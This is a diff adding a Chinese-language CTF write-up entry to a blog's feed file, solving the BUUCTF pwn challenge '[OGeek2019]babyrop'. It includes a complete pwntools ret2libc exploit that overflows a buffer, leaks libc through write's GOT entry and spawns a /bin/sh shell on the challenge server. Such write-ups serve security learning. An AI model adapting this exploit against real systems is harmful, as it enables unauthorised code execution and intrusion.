@@ -58,6 +58,33 @@
     
     
     <entry>
+      <title>BUUCTF-PWN-[OGeek2019]babyrop</title>
+      <link href="/20211113-ctf-babyrop/"/>
+      <url>/20211113-ctf-babyrop/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-PWN-OGeek2019-babyrop"><a href="#BUUCTF-PWN-OGeek2019-babyrop" class="headerlink" title="BUUCTF-PWN-[OGeek2019]babyrop"></a>BUUCTF-PWN-[OGeek2019]babyrop</h1><p>这题需要用到一些plt和got等的前置知识，可以参考：<a href="https://bbs.pediy.com/thread-262357.htm">https://bbs.pediy.com/thread-262357.htm</a></p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111131312623.png" alt="image-20211113131237228"></p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111131318821.png" alt="image-20211113131844182"></p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111131319356.png" alt="image-20211113131909584"></p><p><code>sub_804871F</code>函数的返回值就是下面<code>sub_80487D0</code>的参数（<code>v5 --&gt; a1</code>）</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111131319804.png" alt="image-20211113131926631"></p><p>而在<code>sub_80487D0</code>中第二个<code>read</code>函数是可能的溢出点，条件是<code>a1 ！= 127</code>并且<code>a1</code>大于<code>buf</code>的长度</p><p>之后利用题目给出的libc，使用ret2libc的方法拿到shell</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25034</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">6</span> + <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xe7</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#          # 覆盖buf        # 溢出到write的plt表 # write返回到main   # write(1, write_got, 4)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>.encode()))</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">paylaod3 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xe7</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(paylaod3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br></pre></td></tr></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111131326028.png" alt="image-20211113132600072"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BUUCTF-PWN-ciscn_2019_c_1</title>
       <link href="/20211112-ctf-ciscn_2019_c_1/"/>
       <url>/20211112-ctf-ciscn_2019_c_1/</url>
